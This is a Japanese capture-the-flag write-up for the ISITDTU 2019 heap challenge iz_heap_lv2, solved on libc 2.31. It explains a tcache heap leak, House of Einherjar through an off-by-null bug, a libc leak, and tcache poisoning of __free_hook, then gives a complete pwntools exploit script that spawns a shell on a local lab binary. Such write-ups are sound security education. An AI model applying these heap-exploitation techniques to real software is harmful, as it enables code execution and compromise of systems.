---
tags: pwn
---

# ISITDTU CTF 2019 Quals - iz_heap_lv2 (+α)

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/isitdtu-team/ISITDTU-CTF-2019>

## Advanved

[ISITDTU CTF 2019 Quals - iz_heap_lv2](/@Xornet/HJ_X3vvAL)をlibc 2.31で解きました。もちろん2.27で解いた際の解法がそのまま使えるわけではないです。

## Writeup

※checksecとBinary, Vulnerabilityは前問と同じなので省略

### Outline

2.27版と違ってUnsorted Binへ送る際のチェックにprev_sizeを見るというのが追加されたのであちらと同じようなExploitは通用しない
ただ、[SECCON Beginners CTF 2020 - Childheap (+α)](/@Xornet/HklcV2j0L)のようにHeap leakが出来ればHouse of Einherjarが初出と殆ど同様に適用できるのでHeap leakを目指す。
単純なUAFは無い上にadd時にヌルバイトを付与するのでtcacheからの再取得時にnextメンバが潰されて一見不可能に見えるが、このヌルバイト付与が読み込んだ文字の後ろに付けるのでは無く、`p[size]`に付けるため、tcacheからの再取得時にサイズを0にすればnextメンバを破壊せずに読む事ができる(↓のコードは1文字は必ずデータを送信する仕様なので末尾バイトはデバッガ覗いて確定させた)。
後はHouse of Einherjarで真上のチャンクを指すポインタが生きている状態で結合させてUnsorted Binへ送ればlibc leakが出来、overlapしているので頑張ればtcache中にある状態でnextを書き換えてtcache poisoningが出来るので`__free_hook`を書き換える

### Heap leak

Outlineにも書いている通りでヌルバイトの付与先が次のチャンクのサイズヘッダである。よってtcacheに送られた際のnextメンバがヌルバイトに邪魔されず普通に覗けるのでこれを利用してHeap leakする。
具体的にはtcacheに入るサイズで2回addしてどちらもfreeする(topとの結合はtcacheだと発生しないので特に気にしなくて良い)
この時該当サイズのtcacheは`top -> A -> B -> null`のようになっている

この状態で該当サイズでaddすれば`A`を得られるのだがadd前のメモリは次のようになっている

```
(prev_size: 未使用) (mchunk_size)
(next: Bのアドレス)  (key)
...
```

これが`add`時のeditで`next`の位置から書き込まれるのだが0バイト書き込みも可能な上に`next`は残っているので`show`でBのアドレスを読むことが出来る。これでHeap領域からの位置を計算するなりデバッガで覗くなりして確定させればHeap baseが判明し、以後取得されるチャンクの位置を計算することが出来る、これはHouse of Einherjarでfreeされたと偽装するチャンクのfd, bkメンバに使用する

ちなみに勘違いしていたのだがkeyメンバはtcacheからの確保時に消されるので読むことは出来ない。これが残ったまま確保され、再びfreeされるとtcache_perthread_structを調べてDouble Freeチェックが行われて効率が悪い。
更にnextメンバを変更しないままfreeするとDouble Freeしていないにも関わらずDouble Free検知されてしまうので当然である

### House of Einherjar

HoE自体の説明は[SECCON Beginners CTF 2020 - Childheap (+α)](/9l6FSAdZRpWhgbarA7Efcg)でしているのでそちらと[非常にわかりやすい初出スライド](https://www.slideshare.net/codeblue_jp/cb16-matsukuma-ja-68459648)を参考にして頂くとする。
事前に0x100のサイズのtcacheを埋めておき、次のようなメモリ配置にする

```
A: off-by-nullを引き起こすチャンク、サイズはtcacheの先頭に持ってこれるなら任意
B: ターゲットチャンク、サイズは0x100
```

ここでAをfreeする。そして再び確保するとBのサイズヘッダがヌルバイトで潰されてAが使用中にも関わらずPREV_INUSEが0になる。そしてBをfreeするとAを巻き込むBackward Consolidationが走ってAを指すポインタが生きているにも関わらずA+BがUnsorted Binへ送られる。
但し、そこそこのチェックはあり、Bのprev_sizeがAのサイズと一致しているか?Aのfd, bkメンバは正当(fdで示された箇所のチャンクのbkが自身であるか、逆も然り)かがチェックされる。
というわけでHeap leak経由で得たHeap baseを利用してAのアドレスを特定しておき、fd, bkに設定しprev_sizeも整えておけば無事に結合されてUnsorted Binへ送られる。

### libc leak + いつもの

Aを指すポインタ(`p_0`と置く)は生きているのでインデックスを指定してshowすればlibc leakが出来る。
またここでaddでUnsorted Binからチャンクを切り出すと再びAを指す別のポインタ(`p_1`)が得られる。
よって`free(p_0)`して`edit(p_1)`すればtcache中にある`p_0`のnextメンバを書き換えることが出来るのでここに`__frer_hook`のアドレスを設定してあとはいつも通り`system`を仕込んで`"/bin/sh"`が入っているチャンクをfreeしてシェルを取る。
editがあるお陰でChildheapより大分楽にtcache poisoningが出来た

## Code

```python
from pwn import p64, u64, process, ELF, gdb


def select(s, sel, c=b"Choice: "):
    s.recvuntil(c)
    s.sendline(str(sel))


def add(s, size, data=b"junk"):
    select(s, 1)
    s.recvuntil(b"size: ")
    s.sendline(str(size))
    s.recvuntil(b"data: ")
    s.send(data)


def delete(s, idx):
    select(s, 3)
    s.recvuntil(b"index: ")
    s.sendline(str(idx))


def edit(s, idx, data):
    select(s, 2)
    s.recvuntil(b"index: ")
    s.sendline(str(idx))
    s.recvuntil(b"data: ")
    s.send(data)


def show(s, idx):
    select(s, 4)
    s.recvuntil(b"index: ")
    s.sendline(str(idx))
    s.recvuntil(b"Data: ")
    return s.recvline().rstrip()


if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    """
    """
        - 今回も1同様サイズとインデックスのチェックは無
        - free時にポインタはクリアされる
        - 今回はまともなshowが出来る
        - off-by-null
        - libc 2.31 challenge
    """
    s = process("./iz_heap_lv2")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    free_hook_libc = libc.symbols["__free_hook"]
    system_libc = libc.symbols["system"]
    
    add(s, 0xf8)  # 0
    add(s, 0xf8)  # 1
    delete(s, 0)
    delete(s, 1)
    add(s, 0xf8, b"a") # 0

    heap_base = u64(show(s, 0).ljust(8, b"\x00")) - 0x261
    print(hex(heap_base))

    # fill tcache
    for _ in range(6):
        add(s, 0xf8)  # 1 ~ 6

    # overlap
    add(s, 0x18)  # 7
    add(s, 0xf8)  # 8 target
    add(s, 0x18)  # 9
    add(s, 0x18)  # 10

    for i in range(7):
        delete(s, i)

    # HoE
    fake_fdbk = heap_base + 0x990
    payload = p64(fake_fdbk) + p64(fake_fdbk) + p64(0x20)
    delete(s, 7)
    add(s, 0x18, payload)  # 0

    delete(s, 8)

    libc_addr = u64(show(s, 0).ljust(8, b"\x00")) - 0x1ebbe0
    print(hex(libc_addr))

    # increase tcache count
    add(s, 0x18)  # 1
    delete(s, 9)
    delete(s, 10)
    delete(s, 1)

    payload = p64(libc_addr + free_hook_libc)
    edit(s, 0, payload)
    add(s, 0x18)  # 1
    add(s, 0x18, p64(libc_addr + system_libc))  # 2

    add(s, 0x100, b"/bin/sh\x00")  # 3
    delete(s, 3)

    s.interactive()

```

## Flag

いつものローカルシェル奪取

## 感想

heap leakさえ出来れば後は[SECCON Beginners CTF 2020 - Childheap (+α)](/9l6FSAdZRpWhgbarA7Efcg)の複数ポインタ版でした。あちらと違ってPREV_INUSEを潰して巻き込むチャンクが2つで済むのでメモリレイアウトを考えるのが多少楽。
前回同様インデックスの管理が面倒で最後のdeleteに使うインデックス幾つだ???ってところで5分ぐらい潰しました